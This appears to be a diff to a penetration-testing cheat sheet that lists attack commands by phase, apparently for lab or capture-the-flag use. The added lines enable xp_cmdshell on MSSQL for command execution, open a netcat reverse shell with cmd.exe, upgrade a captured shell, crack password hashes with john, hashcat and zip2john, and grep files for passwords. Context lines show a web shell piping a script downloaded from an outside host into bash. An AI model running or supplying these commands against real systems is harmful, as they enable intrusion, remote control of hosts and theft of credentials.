@@ -99,6 +99,15 @@ MariaDB [(none)]> SHOW tables;
 MariaDB [(none)]> SELECT * FROM <table name>;
 ```
 
+- MSSQL
+
+```
+$ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
+SQL> SELECT is_srvrolemember('sysadmin');
+SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+SQL> EXEC xp_cmdshell "whoami";
+```
+
 - AWS
 
 ```
@@ -111,6 +120,12 @@ $ aws --endpoint=<URL> s3 cp <filename> s3://<S3 bucket name>
 
 ```
 $ curl -v <URL>
+```
+
+- Wget
+
+```
+$ wget http://<IP address>/<file> -outfile <file>"
 ```
 
 - Server Side Template Injection (SSTI)
@@ -162,12 +177,20 @@ http://<domain name>/shell.php?cmd=curl%20<IP address>:8000/shell.sh|bash
 
 ```
 $ john -w=/usr/share/wordlists/rockyou.txt hash.txt
+$ john --show hashes.txt
+```
+
+- HashID
+
+```
+$ hashid <hash>
 ```
 
 - Netcat
 
 ```
 $ nc -nlvp <port>
+$ nc -nv <IP address> <port> -e cmd.exe
 ```
 
 - Host Files
@@ -180,6 +203,24 @@ $ python3 -m http.server 8000
 
 ```
 $ hydra -L <usernames.txt> -p '<password>' <IP address> ssh
+```
+
+- Escape Restricted Shell
+
+```
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'; CTRL+Z; stty raw -echo; fg; export TERM=XTERM
+```
+
+- Zip2john
+
+```
+$ zip2john <ZIP file> > hashes.txt
+```
+
+- Hashcat
+
+```
+$ hashcat -a 0 -m 0 hashes.txt <wordlist>
 ```
 
 #3. - Lateral Movement
@@ -220,6 +261,36 @@ $ python psexec.py <username>@<IP address>
 #4. - Privilege Escalation
 -----------------------------------------
 
+- WinPEAS
+
+```
+C:\> .\winPEASx64.exe
+```
+
+- LinPEAS
+
+```
+$ .\linpeas.sh
+```
+
+- Find passwords
+
+```
+$ cat * | grep -i passw*
+```
+
+- Sudo
+
+```
+$ sudo -l
+```
+
+- Add /tmp directory to the PATH environmental variable 
+
+```
+$ export PATH=/tmp:$PATH
+```
+
 #5. - Miscellaneous
 -----------------------------------------
 
@@ -247,6 +318,18 @@ Edit /etc/hosts
 $ ss -tulpn
 ```
 
+- Configure your browser to send traffic through a proxy
+
+```
+Preferences -> Network Settings -> Manual Proxy Configuration
+```
+
+- Find a file
+
+```
+$ find / -name <string> 2>/dev/null
+```
+
 #6. - Online Resources
 -----------------------------------------
 
@@ -256,6 +339,12 @@ $ ss -tulpn
 https://www.speedguide.net/port.php?port=3389
 ```
 
+- CrackStation
+
+```
+https://crackstation.net/
+```
+
 #7. - Browser Plugins
 -----------------------------------------
 
@@ -263,4 +352,10 @@ https://www.speedguide.net/port.php?port=3389
 
 ```
 https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
+```
+
+- Cookie Editor: edit cookies
+
+```
+https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
 ```
